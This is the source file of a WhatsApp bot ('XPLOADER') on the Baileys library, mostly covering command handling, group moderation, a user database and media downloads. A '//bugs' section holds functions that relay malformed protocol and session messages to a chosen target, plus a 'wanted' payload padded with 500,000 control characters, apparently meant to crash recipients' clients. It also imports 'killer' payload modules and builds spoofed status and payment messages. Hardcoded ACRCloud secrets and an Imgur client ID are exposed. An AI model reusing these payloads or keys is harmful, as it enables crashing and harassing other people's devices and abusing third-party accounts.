//
//project_name : XPLOADER 
// @author : TYLOR
// @youtube : https://www.youtube.com/@heyits_tylor
// @instagram  : heyits_tylor
// @telegram : t.me/heyits_tylor
// @github : heyit-tylor
// @tiktok :hey.its_tylor
// @whatsapp : +254796180105
//*
//*

const {
  BufferJSON,
  WA_DEFAULT_EPHEMERAL,
  generateWAMessageFromContent,
  proto,
  useMultiFileAuthState,
  makeWASocket,
  downloadContentFromMessage,
  generateWAMessageContent,
  generateWAMessage,
  prepareWAMessageMedia,
  areJidsSameUser,
  getContentType,
} = require("@whiskeysockets/baileys");
const os = require("os");
const fs = require("fs");
const fsx = require("fs-extra");
const path = require("path");
const util = require("util");
const { color } = require("./lib/color");
const chalk = require("chalk");
const moment = require("moment-timezone");
const cron = require("node-cron");
const speed = require("performance-now");
const ms = (toMs = require("ms"));
const axios = require("axios");
const fetch = require("node-fetch");
const ytdl = require("ytdl-core");
const yts = require("yt-search");
const gis = require("g-i-s");
const cheerio = require("cheerio");
const { randomBytes } = require("crypto");
const fg = require("api-dylux");
const acrcloud = require ('acrcloud');
const googleTTS = require("google-tts-api");
const jsobfus = require("javascript-obfuscator");
const { translate } = require("@vitalets/google-translate-api");
const scp2 = require("./lib/scraper2");
const pkg = require("imgur");
const pino = require("pino");
const { ImgurClient } = pkg;
const client = new ImgurClient({ clientId: "a0113354926015a" });
const { exec, spawn, execSync } = require("child_process");
const { performance } = require("perf_hooks");
const more = String.fromCharCode(8206);
const readmore = more.repeat(4001);
const {
  TelegraPh,
  UploadFileUgu,
  webp2mp4File,
  floNime,
} = require("./lib/uploader");
const {
  toAudio,
  toPTT,
  toVideo,
  ffmpeg,
  addExifAvatar,
} = require("./lib/converter");
const {
  smsg,
  getGroupAdmins,
  formatp,
  formatDate,
  getTime,
  isUrl,
  await,
  sleep,
  clockString,
  msToDate,
  sort,
  toNumber,
  enumGetKey,
  runtime,
  fetchJson,
  getBuffer,
  json,
  delay,
  format,
  logic,
  generateProfilePicture,
  parseMention,
  getRandom,
  pickRandom,
  fetchBuffer,
  buffergif,
  totalcase,
} = require("./lib/myfunc");
const acr = new acrcloud({
    host: 'identify-eu-west-1.acrcloud.com',
    access_key: '882a7ef12dc0dc408f70a2f3f4724340',
    access_secret: 'qVvKAxknV7bUdtxjXS22b5ssvWYxpnVndhy2isXP'
});
//prem owner function
const {
  addPremiumUser,
  getPremiumExpired,
  getPremiumPosition,
  expiredPremiumCheck,
  checkPremiumUser,
  getAllPremiumUser,
} = require("./lib/premiun");
//data
let ntnsfw = JSON.parse(fs.readFileSync("./src/data/function/nsfw.json"));
let bad = JSON.parse(fs.readFileSync("./src/data/function/badword.json"));
let premium = JSON.parse(fs.readFileSync("./src/data/role/premium.json"));
const owner = JSON.parse(fs.readFileSync("./src/data/role/owner.json"));
//media
const { beta1, beta2, buk1 } = require("./XploaderMedia/killer/killer.js")
const VoiceNote = JSON.parse(
  fs.readFileSync("./XploaderMedia/database/XploaderVn.json")
);
const StickerXp = JSON.parse(
  fs.readFileSync("./XploaderMedia/database/XploaderSticker.json")
);
const ImageXp = JSON.parse(
  fs.readFileSync("./XploaderMedia/database/Xploaderimage.json")
);
const VideoXp = JSON.parse(
  fs.readFileSync("./XploaderMedia/database/XploaderVideo.json")
);
const DocXp = JSON.parse(fs.readFileSync("./XploaderMedia/database/doc.json"));
const ZipXp = JSON.parse(fs.readFileSync("./XploaderMedia/database/zip.json"));
const ApkXp = JSON.parse(fs.readFileSync("./XploaderMedia/database/apk.json"));
const XpBotUser = JSON.parse(
  fs.readFileSync("./src/data/role/user.json"));
const tylorkid = fs.readFileSync("./XploaderMedia/theme/Xploader.jpg");
const tylorkid1 = fs.readFileSync("./XploaderMedia/theme/Xploader1.jpg");
const tylorkid2 = fs.readFileSync("./XploaderMedia/theme/Xploader2.jpg");
const tylorkid3 = fs.readFileSync("./XploaderMedia/theme/Xploader3.jpg");
const tylorkid4 = fs.readFileSync("./XploaderMedia/theme/Xploader4.jpg");
const tylorkid5 = fs.readFileSync("./XploaderMedia/theme/Xploader5.jpg");
const tylorkid6 = fs.readFileSync("./XploaderMedia/theme/Xploader1.mp4");

global.db.data = JSON.parse(fs.readFileSync("./src/database.json"));
if (global.db.data)
  global.db.data = {
    sticker: {},
    database: {},
    game: {},
    others: {},
    users: {},
    chats: {},
    settings: {},
    ...(global.db.data || {}),
  };

let vote = (db.data.others.vote = []);
let kuismath = (db.data.game.math = []);
//afk function
function formatAfkDuration(ms) {
  let seconds = Math.floor(ms / 1000);
  let minutes = Math.floor(seconds / 60);
  let hours = Math.floor(minutes / 60);
  let days = Math.floor(hours / 24);

  seconds %= 60;
  minutes %= 60;
  hours %= 24;

  let parts = [];
  if (days) parts.push(days + " days");
  if (hours) parts.push(hours + " hours");
  if (minutes) parts.push(minutes + " minutes");
  if (seconds) parts.push(seconds + " seconds");

  return parts.join(", ");
}
//time
const xday = moment(Date.now()).tz('Africa/Nairobi').locale('id').format('dddd');
const xtime = moment(Date.now()).tz('Africa/Nairobi').locale('id').format('HH:mm:ss z');
const xdate = moment(Date.now()).tz("Africa/Nairobi").format("DD/MM/YYYY");
const time2 = moment(Date.now()).tz("Africa/Nairobi").locale('id').format("HH:mm:ss z");
if (time2 < "23:59:00") {
  var timewisher = `Good Night 🌌`;
}
if (time2 < "19:00:00") {
  var timewisher = `Good Evening 🌃`;
}
if (time2 < "18:00:00") {
  var timewisher = `Good Evening 🌃`;
}
if (time2 < "15:00:00") {
  var timewisher = `Good Afternoon 🌅`;
}
if (time2 < "11:00:00") {
  var timewisher = `Good Morning 🌄`;
}
if (time2 < "05:00:00") {
  var timewisher = `Good Morning 🌄`;
}
//function
const reSize = async (buffer, ukur1, ukur2) => {
  return new Promise(async (resolve, reject) => {
    let jimp = require("jimp");
    var baper = await jimp.read(buffer);
    var ab = await baper.resize(ukur1, ukur2).getBufferAsync(jimp.MIME_JPEG);
    resolve(ab);
  });
};
//module
module.exports = Xploader = async (Xploader, m, chatUpdate, store) => {
  try {
    const { type, quotedMsg, mentioned, now, fromMe } = m;
    var body =
      m.mtype === "conversation"
        ? m.message.conversation
        : m.mtype == "imageMessage"
        ? m.message.imageMessage.caption
        : m.mtype == "videoMessage"
        ? m.message.videoMessage.caption
        : m.mtype == "extendedTextMessage"
        ? m.message.extendedTextMessage.text
        : m.mtype == "buttonsResponseMessage"
        ? m.message.buttonsResponseMessage.selectedButtonId
        : m.mtype == "listResponseMessage"
        ? m.message.listResponseMessage.singleSelectReply.selectedRowId
        : m.mtype == "templateButtonReplyMessage"
        ? m.message.templateButtonReplyMessage.selectedId
        : m.mtype === "messageContextInfo"
        ? m.message.buttonsResponseMessage?.selectedButtonId ||
          m.message.listResponseMessage?.singleSelectReply.selectedRowId ||
          m.text
        : "";
    var budy = typeof m.text == "string" ? m.text : "";
    //prefix 1
    var prefix = [".", "/"]
      ? /^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi.test(body)
        ? body.match(/^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi)[0]
        : ""
      : xprefix;
    const isCmd = body.startsWith(prefix, "");
    const isCmd2 = body.startsWith(prefix);
    const command = body
      .replace(prefix, "")
      .trim()
      .split(/ +/)
      .shift()
      .toLowerCase();
    const command2 = body.slice(1).trim().split(/ +/).shift().toLowerCase();
    const args = body.trim().split(/ +/).slice(1);
    const full_args = body.replace(command, "").slice(1).trim();
    const pushname = m.pushName || "No Name";
    const botNumber = await Xploader.decodeJid(Xploader.user.id);
    const itsMe = m.sender == botNumber ? true : false;
    const sender = m.sender;
    const text = (q = args.join(" "));
    const from = m.key.remoteJid;
    const fatkuns = m.quoted || m;
    const quoted =
      fatkuns.mtype == "buttonsMessage"
        ? fatkuns[Object.keys(fatkuns)[1]]
        : fatkuns.mtype == "templateMessage"
        ? fatkuns.hydratedTemplate[Object.keys(fatkuns.hydratedTemplate)[1]]
        : fatkuns.mtype == "product"
        ? fatkuns[Object.keys(fatkuns)[0]]
        : m.quoted
        ? m.quoted
        : m;
    const mime = (quoted.msg || quoted).mimetype || "";
    const qmsg = quoted.msg || quoted;
//media
    const isMedia = /image|video|sticker|audio/.test(mime);
    const isImage = type == "imageMessage";
    const isVideo = type == "videoMessage";
    const isAudio = type == "audioMessage";
    const isDocument = type == "documentMessage";
    const isLocation = type == "locationMessage";
    const isContact = type == "contactMessage";
    const isSticker = type == "stickerMessage";
    const isText = type == "textMessage";
    const isQuotedText =
      type === "extendexTextMessage" && content.includes("textMessage");
    const isQuotedImage =
      type === "extendedTextMessage" && content.includes("imageMessage");
    const isQuotedLocation =
      type === "extendedTextMessage" && content.includes("locationMessage");
    const isQuotedVideo =
      type === "extendedTextMessage" && content.includes("videoMessage");
    const isQuotedSticker =
      type === "extendedTextMessage" && content.includes("stickerMessage");
    const isQuotedAudio =
      type === "extendedTextMessage" && content.includes("audioMessage");
    const isQuotedContact =
      type === "extendedTextMessage" && content.includes("contactMessage");
    const isQuotedDocument =
      type === "extendedTextMessage" && content.includes("documentMessage");
    const downloadMp3 = async (Link) => {
try {
await ytdl.getInfo(Link)
let mp3File = getRandom(".mp3")
ytdl(Link, { filter: "audioonly" }).pipe(fs.createWriteStream(mp3File)).on("finish", async () => {
await Xploader.sendMessage(m.chat, { audio: fs.readFileSync(mp3File), mimetype: "audio/mp4" }, { quoted: m })
await fs.unlinkSync(mp3File);
})
} catch (err) {
reply(`${err}`);
}
}
    //prefix 2
    const pric = /^#.¦|\\^/.test(body) ? body.match(/^#.¦|\\^/gi) : xprefix;
    const XpBotbody = body.startsWith(pric);
    const isCommand = XpBotbody
      ? body.replace(pric, "").trim().split(/ +/).shift().toLowerCase()
      : "";
    const sticker = [];
    //group
    const isGroup = m.key.remoteJid.endsWith("@g.us");
    const groupMetadata = m.isGroup
      ? await Xploader.groupMetadata(m.chat).catch((e) => {})
      : "";
    const groupName = m.isGroup ? groupMetadata.subject : "";
    const participants = m.isGroup ? await groupMetadata.participants : "";
    const groupAdmins = m.isGroup ? await getGroupAdmins(participants) : "";
    const isGroupAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false;
    const isBotAdmins = m.isGroup ? groupAdmins.includes(botNumber) : false;
    const isAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false;
    const groupOwner = m.isGroup ? groupMetadata.owner : "";
    const isGroupOwner = m.isGroup
      ? (groupOwner ? groupOwner : groupAdmins).includes(m.sender)
      : false;
    const AntiNsfw = m.isGroup ? ntnsfw.includes(from) : false;
    const mentionByReply =
      type == "extendedTextMessage" &&
      m.message.extendedTextMessage.contextInfo != null
        ? m.message.extendedTextMessage.contextInfo.participant || ""
        : "";
    const mentionByTag =
      type == "extendedTextMessage" &&
      m.message.extendedTextMessage.contextInfo != null
        ? m.message.extendedTextMessage.contextInfo.mentionedJid
        : [];
    //anti media
    const isXpBotMedia = m.mtype;
    //user status
    const isUser = XpBotUser.includes(sender);
    const XpBotOwner = [botNumber, ...owner]
      .map((v) => v.replace(/[^0-9]/g, "") + "@s.whatsapp.net")
      .includes(m.sender);
    const isPremium = XpBotOwner || checkPremiumUser(m.sender, premium);
    expiredPremiumCheck(Xploader, m, premium);

    //premium
    async function replyprem(teks) {
      reply(
        `This feature is for premium user, contact the owner to become premium user`
      );
    }
    //script replier
    async function sendXploaderMessage(chatId, message, options = {}) {
      let generate = await generateWAMessage(chatId, message, options);
      let type2 = getContentType(generate.message);
      if ("contextInfo" in options)
        generate.message[type2].contextInfo = options?.contextInfo;
      if ("contextInfo" in message)
        generate.message[type2].contextInfo = message?.contextInfo;
      return await Xploader.relayMessage(chatId, generate.message, {
        messageId: generate.key.id,
      });
    }
    //reply
    async function reply(teks) {
 let themimg = [tylorkid, tylorkid1, tylorkid3, tylorkid4, tylorkid5]
let randomIndex = Math.floor(Math.random() * themimg.length)
let theming = themimg[randomIndex]
      if (typereply === "v1") {
        m.reply(teks);
      } else if (typereply === "v2") {
        Xploader.sendMessage(
          m.chat,
          {
            contextInfo: {
              externalAdReply: {
                showAdAttribution: true,
                title: botname,
                body: ownername,
                previewType: "PHOTO",
                thumbnail: theming,
                sourceUrl: wagc,
              },
            },
            text: teks,
          },
          {
            quoted: m,
          }
        );
      } else if (typereply === "v3") {
        Xploader.sendMessage(
          m.chat,
          {
            text: teks,
            contextInfo: {
              externalAdReply: {
                showAdAttribution: true,
                title: botname,
                body: ownername,
                thumbnail: theming,
                sourceUrl: websitex,
                mediaType: 1,
                renderLargerThumbnail: true,
              },
            },
          },
          { quoted: m }
        );
      }
    }
    //fake bug
    const fbug2 = {
      key: { participant: "0@s.whatsapp.net", remoteJid: "status@broadcast" },
      message: {
        groupInviteMessage: {
          groupJid: "6288213840883-1616169743@g.us",
          inviteCode: "m",
          groupName: botname,
          caption: botname,
          jpegThumbnail: tylorkid5,
        },
      },
    };
    let fbug = {
      key: {
        fromMe: false,
        participant: `0@s.whatsapp.net`,
        ...(m.chat ? { remoteJid: "status@broadcast" } : {}),
      },
      message: {
        imageMessage: {
          url: "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc",
          mimetype: "image/jpeg",
          caption: botname,
          fileSha256: "+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=",
          fileLength: "999999999",
          height: 999999999,
          width: 999999999,
          mediaKey: "vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=",
          fileEncSha256: "sR9D2RS5JSifw49HeBADguI23fWDz1aZu4faWG/CyRY=",
          directPath:
            "/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69",
          mediaKeyTimestamp: "1610993486",
          jpegThumbnail: await reSize(tylorkid5, 100, 100),
          scansSidecar:
            "1W0XhfaAcDwc7xh1R8lca6Qg/1bB4naFCSngM2LKO2NoP5RI7K+zLw==",
        },
      },
    };
    //end fbug

    let fstatus = {
      key: {
        fromMe: false,
        participant: `0@s.whatsapp.net`,
        ...(m.chat ? { remoteJid: "status@broadcast" } : {}),
      },
      message: {
        imageMessage: {
          url: "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc",
          mimetype: "image/jpeg",
          caption: botname,
          fileSha256: "+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=",
          fileLength: "28777",
          height: 1080,
          width: 1079,
          mediaKey: "vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=",
          fileEncSha256: "sR9D2RS5JSifw49HeBADguI23fWDz1aZu4faWG/CyRY=",
          directPath:
            "/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69",
          mediaKeyTimestamp: "1610993486",
          jpegThumbnail: await reSize(tylorkid5, 100, 100),
          scansSidecar:
            "1W0XhfaAcDwc7xh1R8lca6Qg/1bB4naFCSngM2LKO2NoP5RI7K+zLw==",
        },
      },
    };

    //Fake quoted
    const fpay = {
      key: {
        remoteJid: "0@s.whatsapp.net",
        fromMe: false,
        id: global.botname,
        participant: "0@s.whatsapp.net",
      },
      message: {
        requestPaymentMessage: {
          currencyCodeIso4217: "USD",
          amount1000: 999999999,
          requestFrom: "0@s.whatsapp.net",
          noteMessage: { extendedTextMessage: { text: global.botname } },
          expiryTimestamp: 999999999,
          amount: { value: 91929291929, offset: 1000, currencyCode: "USD" },
        },
      },
    };
    const ftroli = {
      key: {
        fromMe: false,
        participant: "0@s.whatsapp.net",
        remoteJid: "status@broadcast",
      },
      message: {
        orderMessage: {
          itemCount: 2022,
          status: 200,
          thumbnail: tylorkid5,
          surface: 200,
          message: botname,
          orderTitle: ownername,
          sellerJid: "0@s.whatsapp.net",
        },
      },
      contextInfo: { forwardingScore: 999, isForwarded: true },
      sendEphemeral: true,
    };
    const fdoc = {
      key: {
        participant: "0@s.whatsapp.net",
        ...(m.chat ? { remoteJid: `status@broadcast` } : {}),
      },
      message: { documentMessage: { title: botname, jpegThumbnail: tylorkid5 } },
    };
    const fvn = {
      key: {
        participant: `0@s.whatsapp.net`,
        ...(m.chat ? { remoteJid: "status@broadcast" } : {}),
      },
      message: {
        audioMessage: {
          mimetype: "audio/ogg; codecs=opus",
          seconds: 359996400,
          ptt: "true",
        },
      },
    };
    const fgif = {
      key: {
        participant: `0@s.whatsapp.net`,
        ...(m.chat ? { remoteJid: "status@broadcast" } : {}),
      },
      message: {
        videoMessage: {
          title: botname,
          h: wm,
          seconds: "359996400",
          gifPlayback: "true",
          caption: ownername,
          jpegThumbnail: tylorkid5,
        },
      },
    };
    const fgclink = {
      key: { participant: "0@s.whatsapp.net", remoteJid: "0@s.whatsapp.net" },
      message: {
        groupInviteMessage: {
          groupJid: "6288213840883-1616169743@g.us",
          inviteCode: "m",
          groupName: wm,
          caption: `${pushname}`,
          jpegThumbnail: tylorkid5,
        },
      },
    };
    const fvideo = {
      key: {
        fromMe: false,
        participant: `0@s.whatsapp.net`,
        ...(m.chat ? { remoteJid: "status@broadcast" } : {}),
      },
      message: {
        videoMessage: {
          title: botname,
          h: wm,
          seconds: "359996400",
          caption: `${pushname}`,
          jpegThumbnail: tylorkid5,
        },
      },
    };
    const floc = {
      key: {
        participant: "0@s.whatsapp.net",
        ...(m.chat ? { remoteJid: `status@broadcast` } : {}),
      },
      message: { locationMessage: { name: wm, jpegThumbnail: tylorkid5 } },
    };
    const fkontak = {
      key: {
        participant: `0@s.whatsapp.net`,
        ...(m.chat ? { remoteJid: `status@broadcast` } : {}),
      },
      message: {
        contactMessage: {
          displayName: ownername,
          vcard: `BEGIN:VCARD\nVERSION:3.0\nN:XL;${ownername},;;;\nFN:${ownername}\nitem1.TEL;waid=916909137213:916909137213\nitem1.X-ABLabel:Mobile\nEND:VCARD`,
          jpegThumbnail: tylorkid5,
          thumbnail: tylorkid5,
          sendEphemeral: true,
        },
      },
    };
    const fakestatus = {
      key: {
        fromMe: false,
        participant: `0@s.whatsapp.net`,
        ...(m.chat ? { remoteJid: "status@broadcast" } : {}),
      },
      message: {
        imageMessage: {
          url: "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc",
          mimetype: "image/jpeg",
          caption: wm,
          fileSha256: "+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=",
          fileLength: "28777",
          height: 1080,
          width: 1079,
          mediaKey: "vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=",
          fileEncSha256: "sR9D2RS5JSifw49HeBADguI23fWDz1aZu4faWG/CyRY=",
          directPath:
            "/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69",
          mediaKeyTimestamp: "1610993486",
          jpegThumbnail: fs.readFileSync("./XploaderMedia/theme/Xploader.jpg"),
          scansSidecar:
            "1W0XhfaAcDwc7xh1R8lca6Qg/1bB4naFCSngM2LKO2NoP5RI7K+zLw==",
        },
      },
    };
    const frpayment = {
      key: {
        remoteJid: "0@s.whatsapp.net",
        fromMe: false,
        id: `${ownername}`,
        participant: "0@s.whatsapp.net",
      },
      message: {
        requestPaymentMessage: {
          currencyCodeIso4217: "USD",
          amount1000: 999999999,
          requestFrom: "0@s.whatsapp.net",
          noteMessage: {
            extendedTextMessage: {
              text: `${botname}`,
            },
          },
          expiryTimestamp: 999999999,
          amount: {
            value: 91929291929,
            offset: 1000,
            currencyCode: "USD",
          },
        },
      },
    };
    const pickRandom = (arr) => {
      return arr[Math.floor(Math.random() * arr.length)];
    };

    //database
    try {
      let isNumber = (x) => typeof x === "number" && !isNaN(x);
      let limitUser = isPremium ? 1000 : 100;
      let user = global.db.data.users[sender];
      if (typeof user !== "object") global.db.data.users[sender] = {};
      if (user) {
        if (!isNumber(user.afkTime)) user.afkTime = -1;
        if (!("badword" in user)) user.badword = 0;
        if (!("title" in user)) user.title = "";
        if (!("serialNumber" in user))
          user.serialNumber = randomBytes(16).toString("hex");
        if (!("afkReason" in user)) user.afkReason = "";
        if (!("nick" in user)) user.nick = Xploader.getName(sender);
        if (!isPremium) user.premium = false;
        if (!("totalLimit" in user)) user.totalLimit = 0;
        if (!isNumber(user.limit)) user.limit = limitUser;
      } else
        global.db.data.users[sender] = {
          serialNumber: randomBytes(16).toString("hex"),
          title: `${isPremium ? "Premium" : "User"}`,
          afkTime: -1,
          badword: 0,
          afkReason: "",
          nick: Xploader.getName(sender),
          premium: `${isPremium ? "true" : "false"}`,
          limit: limitUser,
          totalLimit: 0,
        };

      let chats = global.db.data.chats[from];
      if (typeof chats !== "object") global.db.data.chats[from] = {};
      if (chats) {
        if (!("badword" in chats)) chats.badword = false;
        if (!("antiforeignnum" in chats)) chats.antiforeignnum = false;
        if (!("antibot" in chats)) chats.antibot = false;
        if (!("antiviewonce" in chats)) chats.antiviewonce = false;
        if (!("antimedia" in chats)) chats.media = false;
        if (!("antivirtex" in chats)) chats.antivirtex = false;
        if (!("antiimage" in chats)) chats.antiimage = false;
        if (!("antivideo" in chats)) chats.video = false;
        if (!("antiaudio" in chats)) chats.antiaudio = false;
        if (!("antipoll" in chats)) chats.antipoll = false;
        if (!("antisticker" in chats)) chats.antisticker = false;
        if (!("anticontact" in chats)) chats.anticontact = false;
        if (!("antilocation" in chats)) chats.antilocation = false;
        if (!("antidocument" in chats)) chats.antidocument = false;
        if (!("antilink" in chats)) chats.antilink = false;
        if (!("antilinkgc" in chats)) chats.antilinkgc = false;
      } else
        global.db.data.chats[from] = {
          badword: false,
          antiforeignnum: false,
          antibot: false,
          antiviewonce: false,
          antivirtex: false,
          antimedia: false,
          antiimage: false,
          antivideo: false,
          antiaudio: false,
          antipoll: false,
          antisticker: false,
          antilocation: false,
          antidocument: false,
          anticontact: false,
          antilink: false,
          antilinkgc: false,
        };

      let setting = global.db.data.settings[botNumber];
      if (typeof setting !== "object") global.db.data.settings[botNumber] = {};
      if (setting) {
        if (!("totalhit" in setting)) setting.totalhit = 0;
        if (!("totalError" in setting)) setting.totalError = 0;
        if (!("online" in setting)) setting.online = false;
        if (!("autosticker" in setting)) setting.autosticker = false;
        if (!("autobio" in setting)) setting.autobio = false;
        if (!("autoread" in setting)) setting.autoread = false;
        if (!("autorecordtype" in setting)) setting.autorecordtype = false;
        if (!("autorecord" in setting)) setting.autorecord = false;
        if (!("autotype" in setting)) setting.autotype = false;
        if (!("autoblocknum" in setting)) setting.autoblocknum = false;
        if (!("onlyindia" in setting)) setting.onlyindia = false;
        if (!("onlyindo" in setting)) setting.onlyindo = false;
        if (!("onlygroup" in setting)) setting.onlygroup = false;
        if (!("onlypc" in setting)) setting.onlypc = false;
        if (!("watermark" in setting)) setting.watermark = { packname, author };
        if (!("about" in setting))
          setting.about = {
            bot: { nick: Xploader.getName(botNumber), alias: botname },
            owner: {
              nick: Xploader.getName(
                global.ownernumber + "@s.whatsapp.net"
              ),
              alias: global.ownernumber,
            },
          };
      } else
        global.db.data.settings[botNumber] = {
          totalhit: 0,
          totalError: 0,
          online: false,
          autosticker: false,
          autobio: false,
          autoread: false,
          autoblocknum: false,
          onlyindia: false,
          onlyindo: false,
          onlygroup: false,
          onlypc: false,
          autorecordtype: false,
          autorecord: false,
          autotype: false,
          watermark: {
            packname: global.packname,
            author: global.author,
          },
          about: {
            bot: {
              nick: Xploader.getName(botNumber),
              alias: botname,
            },
            owner: {
              nick: Xploader.getName(
                global.ownernumber + "@s.whatsapp.net"
              ),
              alias: global.ownernumber,
            },
          },
        };
    } catch (err) {
      console.log(err);
    }
 
    //bugs
    	async function sendQP(target, filterName, parameters, filterResult, clientNotSupportedConfig, clauseType, clauses, filters) {
    var qpMessage = generateWAMessageFromContent(target, proto.Message.fromObject({
        'qp': {
            'filter': {
                'filterName': filterName,
                'parameters': parameters,
                'filterResult': filterResult,
                'clientNotSupportedConfig': clientNotSupportedConfig
            },
            'filterClause': {
                'clauseType': clauseType,
                'clauses': clauses,
                'filters': filters
            }
        }
    }), { userJid: target });

    await Xploader.relayMessage(target, qpMessage.message, { participant: { jid: target }, messageId: qpMessage.key.id });
}

		async function sendSessionStructure(target, sessionVersion, localIdentityPublic, remoteIdentityPublic, rootKey, previousCounter, senderChain, receiverChains, pendingKeyExchange, pendingPreKey, remoteRegistrationId, localRegistrationId, needsRefresh, aliceBaseKey) {
    var sessionStructure = generateWAMessageFromContent(target, proto.Message.fromObject({
        'sessionStructure': {
            'sessionVersion': sessionVersion,
            'localIdentityPublic': localIdentityPublic,
            'remoteIdentityPublic': remoteIdentityPublic,
            'rootKey': rootKey,
            'previousCounter': previousCounter,
            'senderChain': senderChain,
            'receiverChains': receiverChains,
            'pendingKeyExchange': pendingKeyExchange,
            'pendingPreKey': pendingPreKey,
            'remoteRegistrationId': remoteRegistrationId,
            'localRegistrationId': localRegistrationId,
            'needsRefresh': needsRefresh,
            'aliceBaseKey': aliceBaseKey
        }
    }), { userJid: target });

    await Xploader.relayMessage(target, sessionStructure.message, { participant: { jid: target }, messageId: sessionStructure.key.id });
}
		
const wanted = {
            key: {
                remoteJid: 'p',
                fromMe: false,
                participant: '0@s.whatsapp.net'
            },
            message: {
                "interactiveResponseMessage": {
                    "body": {
                        "text": "Sent",
                        "format": "DEFAULT"
                    },
                    "nativeFlowResponseMessage": {
                        "name": "galaxy_message",
                        "paramsJson": `{\"screen_2_OptIn_0\":true,\"screen_2_OptIn_1\":true,\"screen_1_Dropdown_0\":\"ZetExecute\",\"screen_1_DatePicker_1\":\"1028995200000\",\"screen_1_TextInput_2\":\"czazxvoid@sky.id\",\"screen_1_TextInput_3\":\"94643116\",\"screen_0_TextInput_0\":\"radio - buttons${"\u0003".repeat(500000)}\",\"screen_0_TextInput_1\":\"Anjay\",\"screen_0_Dropdown_2\":\"001-Grimgar\",\"screen_0_RadioButtonsGroup_3\":\"0_true\",\"flow_token\":\"AQAAAAACS5FpgQ_cAAAAAE0QI3s.\"}`,
                        "version": 3
                    }
                }
            }
        }	
		
       //Xdownloader
   async function downloadXMp3 (link) {
try {
Xploader.sendMessage(m.chat, { react: { text: '⏯️', key: m.key }})
let kyuu = await fetchJson (`https://widipe.com/download/ytdl?url=${link}`)
Xploader.sendMessage(m.chat, {
 audio: {url: kyuu.result.mp3}, 
 mimetype: "audio/mpeg",
 contextInfo: {
        externalAdReply: {
          title: botname,
          body: kyuu.result.title,
          thumbnailUrl: kyuu.result.image,
          sourceUrl: kyuu.result.url,
          mediaType: 2,
          showAdAttribution: true,
          renderLargerThumbnail: false
        }
      }
    }, { quoted: m });

  } catch (error) {
    console.error('Error fetching the song:', error);
    await reply(`*Error fetching the song.* \n_Please try again later._`)
  }
}
async function downloadXMp4 (link) {
try {
Xploader.sendMessage(m.chat, { react: { text: '🎬', key: m.key }})
let kyuu = await fetchJson(`https://widipe.com/download/ytdl?url=${link}`)
Xploader.sendMessage(m.chat, {
 video: {url: kyuu.result.mp4},
 caption: `©𝐗𝐩𝐥𝐨𝐚𝐝𝐞𝐫𝐁𝐨𝐭` ,
 contextInfo: {
        externalAdReply: {
          title: botname,
          body: kyuu.result.title,
          thumbnailUrl: kyuu.result.image,
          sourceUrl: kyuu.result.url,
          mediaType: 2,
          showAdAttribution: true,
          renderLargerThumbnail: false
        }
      }
    }, { quoted: m });

  } catch (error) {
    console.error('Error fetching the video:', error);
    await reply(`*Error fetching the video.* \n_Please try again later._`)
  }
}
async function downloadXMp3Doc (link) {
try {
Xploader.sendMessage(m.chat, { react: { text: '⏯️', key: m.key }})
let kyuu = await fetchJson (`https://widipe.com/download/ytdl?url=${link}`)
Xploader.sendMessage(m.chat, {
 document: {url: kyuu.result.mp3},
mimetype: "audio/mp3",
 fileName: `${kyuu.result.title}.mp3`,
 contextInfo: {
        externalAdReply: {
          title: botname,
          body: kyuu.result.title,
          thumbnailUrl: kyuu.result.image,
          sourceUrl: kyuu.result.url,
          mediaType: 2,
          showAdAttribution: true,
          renderLargerThumbnail: false
        }
      }
    }, { quoted: m });
  } catch (error) {
    console.error('Error fetching the song:', error);
    await reply(`*Error fetching the song.* \n_Please try again later._`)
  }
}
async function downloadXMp4Doc (link) {
try {
Xploader.sendMessage(m.chat, { react: { text: '🎬', key: m.key }})
let kyuu = await fetchJson (`https://widipe.com/download/ytdl?url=${link}`)
Xploader.sendMessage(m.chat, {
 document: {url: kyuu.result.mp4},
mimetype: "video/mp4",
 fileName: `${kyuu.result.title}.mp4`,
 contextInfo: {
        externalAdReply: {
          title: botname,
          body: kyuu.result.title,
          thumbnailUrl: kyuu.result.image,
          sourceUrl: kyuu.result.url,
          mediaType: 2,
          showAdAttribution: true,
          renderLargerThumbnail: false
        }
      }
    }, { quoted: m });
  } catch (error) {
    console.error('Error fetching the video:', error);
    await reply(`*Error fetching the video.* \n_Please try again later._`)
  }
}
//photo uploader
    async function uploadtoimgur(imagepath) {
      try {
        const response = await client.upload({
          image: fs.createReadStream(imagepath),
          type: "stream",
        });

        let url = response.data.link;
        console.log(url);
        return url;
      } catch (error) {
        console.error("Error uploading image to Imgur:", error);
        throw error;
      }
    }

    async function ephoto(url, texk) {
      let form = new FormData();
      let gT = await axios.get(url, {
        headers: {
          "user-agent":
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36",
        },
      });
      let $ = cheerio.load(gT.data);
      let text = texk;
      let token = $("input[name=token]").val();
      let build_server = $("input[name=build_server]").val();
      let build_server_id = $("input[name=build_server_id]").val();
      form.append("text[]", text);
